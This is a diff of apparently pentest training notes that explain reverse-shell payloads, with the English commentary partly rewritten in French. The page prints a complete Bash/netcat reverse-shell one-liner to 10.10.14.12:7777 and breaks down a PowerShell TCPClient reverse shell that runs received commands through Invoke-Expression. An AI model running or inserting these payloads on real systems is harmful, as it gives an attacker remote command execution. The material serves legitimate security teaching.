@@ -1,4 +1,4 @@
-# Introduction to Payloads ( Linux + Windwos)
+# Introduction to Payloads
 
 ***
 
@@ -11,8 +11,6 @@
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
 ```
 {% endcode %}
-
-The commands above make up a common one-liner issued on a Linux system to serve a Bash shell on a network socket utilizing a Netcat listener. We used this earlier in the Bind Shells section. It's often copied & pasted but not often understood. Let's break down each portion of the one-liner:
 
 <mark style="color:orange;">**Remove /tmp/f**</mark>
 
@@ -60,8 +58,6 @@ Uses Netcat to send a connection to our attack host `10.10.14.12` listening on p
 
 ### <mark style="color:red;">PowerShell One-liner Explained</mark>
 
-The shells & payloads we choose to use largely depend on which OS we are attacking. Be mindful of this as we continue throughout the module. We witnessed this in the reverse shells section by establishing a reverse shell with a Windows system using PowerShell. Let's breakdown the one-liner we used:
-
 #### <mark style="color:green;">**Powershell One-liner**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
@@ -70,15 +66,15 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 ```
 {% endcode %}
 
-We will dissect the rather large PowerShell command you can see above. It may look like a lot, but hopefully, we can demystify it a bit.
-
 <mark style="color:orange;">**Calling PowerShell**</mark>
 
 ```powershell
 powershell -nop -c 
 ```
 
-Executes `powershell.exe` with no profile (`nop`) and executes the command/script block (`-c`) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in `cmd.exe`.
+* Lance `powershell.exe` sans charger de profil (`-NoProfile`) et exécute le bloc de commande/script donné avec `-c` (ou `-Command`).
+* La commande est appelée depuis `cmd.exe`, d’où la présence de `powershell` au début.
+* Utile quand on trouve une vulnérabilité d’exécution distante (RCE) qui permet d’exécuter des instructions directement dans `cmd.exe`.
 
 <mark style="color:orange;">**Binding A Socket**</mark>
 
@@ -86,7 +82,10 @@ Executes `powershell.exe` with no profile (`nop`) and executes the command/scrip
 "$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
 ```
 
-Sets/evaluates the variable `$client` equal to (`=`) the `New-Object` cmdlet, which creates an instance of the `System.Net.Sockets.TCPClient` .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses `(10.10.14.158,443)`. The semi-colon (`;`) ensures the commands & code are executed sequentially.
+* Affecte la variable `$client` à l’objet créé par `New-Object`, ici une instance de `System.Net.Sockets.TCPClient`.
+* Cet objet .NET ouvre un socket TCP vers l’adresse et le port donnés (`10.10.14.158,443`).
+* La connexion se fait au niveau réseau (socket) — utile pour envoyer/recevoir des flux via TCP.
+* Le point-virgule (`;`) sépare les instructions pour qu’elles s’exécutent l’une après l’autre.
 
 <mark style="color:orange;">**Setting The Command Stream**</mark>
 
@@ -94,7 +93,10 @@ Sets/evaluates the variable `$client` equal to (`=`) the `New-Object` cmdlet, wh
 $stream = $client.GetStream();
 ```
 
-Sets/evaluates the variable `$stream` equal to (`=`) the `$client` variable and the .NET framework method called [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) that facilitates network communications. The semi-colon (`;`) ensures the commands & code are executed sequentially.
+* Affecte la variable `$stream` au résultat de `$client.GetStream()`, donc la **NetworkStream** associée au `TCPClient`.
+* Cette NetworkStream représente le flux réseau bidirectionnel lié à la connexion TCP ouverte (permet de lire et d’écrire des octets).
+* Elle sert d’abstraction pour envoyer/recevoir des données via le socket sans manipuler directement les primitives basses-niveaux.
+* Le point-virgule (`;`) sépare les instructions pour qu’elles s’exécutent séquentiellement.
 
 <mark style="color:orange;">**Empty Byte Stream**</mark>
 
@@ -102,7 +104,7 @@ Sets/evaluates the variable `$stream` equal to (`=`) the `$client` variable and 
 [byte[]]$bytes = 0..65535|%{0}; 
 ```
 
-Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.
+Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array.&#x20;
 
 <mark style="color:orange;">**Stream Parameters**</mark>
 
@@ -110,7 +112,10 @@ Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as th
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 ```
 
-Starts a `while` loop containing the `$i` variable set equal to (`=`) the .NET framework [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) (`$stream.Read`) method. The parameters: buffer (`$bytes`), offset (`0`), and count (`$bytes.Length`) are defined inside the parentheses of the method.
+* Affecte `$i` au résultat de `$stream.Read($bytes, 0, $bytes.Length)`, c’est‑à‑dire le nombre d’octets effectivement lus dans le tampon `$bytes`.
+* `Read` lit des octets depuis la `NetworkStream` en commençant à l’`offset` 0 et au plus `count` octets (`$bytes.Length`).
+* Placée dans une boucle `while`, l’affectation est évaluée : la boucle continue tant que `Read` retourne une valeur non nulle (des octets reçus).
+* Quand `Read` retourne 0, cela signifie généralement que la connexion a été fermée et la boucle se termine.
 
 <mark style="color:orange;">**Set The Byte Encoding**</mark>
 
@@ -118,7 +123,10 @@ Starts a `while` loop containing the `$i` variable set equal to (`=`) the .NET f
 {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
 ```
 
-Sets/evaluates the variable `$data` equal to (`=`) an [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding .NET framework class that will be used in conjunction with the `GetString` method to encode the byte stream (`$bytes`) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (`;`) ensures the commands & code are executed sequentially.
+* Affecte `$data` à une instance de la classe .NET `System.Text.ASCIIEncoding`.
+* Permet d’utiliser la méthode `GetString` pour convertir le flux d’octets `$bytes` en texte ASCII lisible.
+* Assure que les données transmises et reçues ne sont pas juste des bits bruts, mais sont encodées en texte.
+* Le point-virgule (`;`) sépare les instructions pour qu’elles s’exécutent séquentiellement.
 
 <mark style="color:orange;">**Invoke-Expression**</mark>
 
@@ -126,15 +134,16 @@ Sets/evaluates the variable `$data` equal to (`=`) an [ASCII](https://en.wikiped
 $sendback = (iex $data 2>&1 | Out-String ); 
 ```
 
-Sets/evaluates the variable `$sendback` equal to (`=`) the Invoke-Expression (`iex`) cmdlet against the `$data` variable, then redirects the standard error (`2>`) `&` standard output (`1`) through a pipe (`|`) to the `Out-String` cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (`;`) ensures the commands & code are executed sequentially.
+* Affecte `$sendback` au résultat de `Invoke-Expression ($data)`, qui exécute le contenu de `$data` comme commande PowerShell sur l’ordinateur local.
+* Redirige la **sortie standard** (`1`) et **l’erreur** (`2>`) vers `Out-String`, qui convertit tout en texte.
+* Permet de capturer à la fois les résultats et les erreurs d’exécution dans une seule chaîne.
+* Le point-virgule (`;`) sépare les instructions pour qu’elles s’exécutent séquentiellement.
 
 <mark style="color:orange;">**Show Working Directory**</mark>
 
 ```powershell
 $sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
 ```
-
-Sets/evaluates the variable `$sendback2` equal to (`=`) the `$sendback` variable plus (`+`) the string PS (`'PS'`) plus `+` path to the working directory (`(pwd).path`) plus (`+`) the string `'> '`. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. The semi-colon (`;`) ensures the commands & code are executed sequentially. Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.
 
 <mark style="color:orange;">**Sets Sendbyte**</mark>
 
